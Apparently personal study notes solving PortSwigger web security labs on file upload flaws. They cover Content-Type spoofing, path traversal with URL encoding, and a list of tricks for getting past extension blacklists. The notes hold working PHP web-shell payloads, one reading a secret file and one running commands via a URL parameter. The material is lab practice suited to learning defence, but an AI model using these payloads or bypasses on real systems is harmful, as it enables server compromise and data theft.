lab2: **Web shell upload via Content-Type restriction bypass**

1)first made an empty file named it exploit.php

2)tried to upload it to see if i accepts and it said 
Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed
2)went to upload it using burp and the avatar part in the request looked like 

```python
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream
```

what if i try to change the content type manually before sending it using intruder 

replaced `application/octet-stream` with image/png

and hit sent and it got accepted saying 
The file avatars/exploit.php has been uploaded.

3)now since i can upload .php files lets see if this file gets executed too 

so went to the file opened it and write this command inside it 

```python
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

it basically tells the server to get the content of that file path so the output should be our flag

4)saved/uploaded the .php file and changed the content type then it got uploaded successfully 

5)get back to profile page right click on the avatar and clicked open image in a new tap

visited the new tap and got the flag there

**Preventing file execution in user-accessible directories:**

sometimes the website knows that not all source have access to execute a code like it doesn't make sense as a developer to let a profile pic file execute commands cuz user can upload files to it, so as a second defense mechanism the developer doesn't allow any files in the folder for example `uploads` get  executed

so uploading .php file doesn't always mean that u can execute commands using that feild due to `Preventing Execution`

so ur code might cause an error or it might show as plain text

so to bypass this extra restriction you can mix `path travesal` with `file upload` it's like telling the server to save your file not in `/var/www/html/uploads/shell.php`
but in `/var/www/html/shell.php` by using smth like `shell.php/../..`

now lets solve 
**Web shell upload via path traversal**

1)found out i can upload a .php file but when i visit it i see my code as plain text it doesn't get executed
file path url is :`web-security-academy.net/files/avatars/exploit.php`
2)tried to change the name of the file using intruder so that it gets back one step and then save the file into 
`web-security-academy.net/files/exploit.php`

instead of files/avatars 

```python
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

so i added ../ since i need to get back one step 

in the response i found it says 
`The file avatars/exploit.php has been uploaded.`

3)it looks like it didn't make a change and it still gets saved in same place 
so i tried to use url encoding to make the path travesal pass 

so now it looks like 

```python
Content-Disposition: form-data; name="avatar"; filename="%2e%2e%2fexploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

and now the response says 

`The file avatars/../exploit.php has been uploaded.`

which means it worked and now i the ../ gets reflected in the url 

4)now get back to profile page right click and open image in a new tap and the path looks like

`/files/avatars/..%2fexploit.php`

and since it gets back a step so just visit `/files/exploit.php`  and you will find the flag

### Bypassing Blacklists (In the Wild)

Even if a website has a "Blacklist" to block certain file extensions, you can use these tricks to bypass it:

- **Case Sensitivity:** If the filter blocks `.php`, try `.pHp` or `.PhP`. Some servers are case-insensitive and will still run the file as PHP.
- **Multiple Extensions:** Try `exploit.php.jpg`. The validation might only check the last part (`.jpg`), but the server might execute the first part (`.php`).
- **Trailing Characters:** Try adding a dot or space at the end: `exploit.php.` or `exploit.php` . Windows servers often strip these characters after validation, turning it back into a valid `.php` file.
- **URL Encoding:** Encode the extension symbols. For example, use `%2E` instead of `.`. If the filter doesn't decode it, but the server does, the exploit works.
- **Null Byte (%00) & Semicolons:** Use `exploit.php%00.jpg` or `exploit.php;.jpg`. High-level languages might see the `.jpg`, but the low-level server (like C-based ones) stops reading at the Null Byte or semicolon.
- **Unicode Normalization:** Use special characters that look like dots or slashes but aren't. When the server "normalizes" the filename, they might turn back into `.` or `/`.
- **Non-Recursive Stripping:** If the filter "erases" the word `.php`, try `exploit.p.phphp`. When it removes the inner `.php`, the remaining letters join together to form `.php`.

now lets solve

**Lab: Web shell upload via obfuscated file extension**

1)first i opened the lab and made my exploit file with that command `<?php echo file_get_contents('/home/carlos/secret'); ?>`

or u can use that command `<?php system ($_Get[’cmd’]`  and inject ur command by making an url parameter https://example.com/cmd=ls
